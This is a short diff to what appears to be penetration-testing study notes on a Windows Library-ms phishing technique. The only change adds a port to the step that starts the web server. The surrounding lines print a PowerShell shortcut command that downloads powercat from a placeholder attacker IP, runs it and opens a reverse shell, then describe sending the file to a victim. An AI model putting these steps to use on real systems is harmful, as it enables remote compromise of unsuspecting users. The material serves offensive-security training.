@@ -3025,7 +3025,7 @@ Library files consist of three major parts written in XML to specify the paramet
 3. In a Window machine, create a shortcut ( <i>automatic_configuration.lnk</i> ) with the following as location
    - `powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<IP>/powercat.ps1');powercat -c <IP> -p <PORT> -e powershell"`
 4. Put `config.Library-ms` and `automatic_configuration.lnk` in the WebDAV directory
-5. Start the Python3 web server to serve `powercat.ps1`, WsgiDAV for the WebDAV share `/home/kali/webdav`, and a Netcat listener on port `4444`
+5. Start the Python3 web server on port `8000` to serve `powercat.ps1`, WsgiDAV for the WebDAV share `/home/kali/webdav`, and a Netcat listener on port `4444`
 6. Send the library file to the victim and wait for them to execute the shortcut file to get a reverse shell
 
 
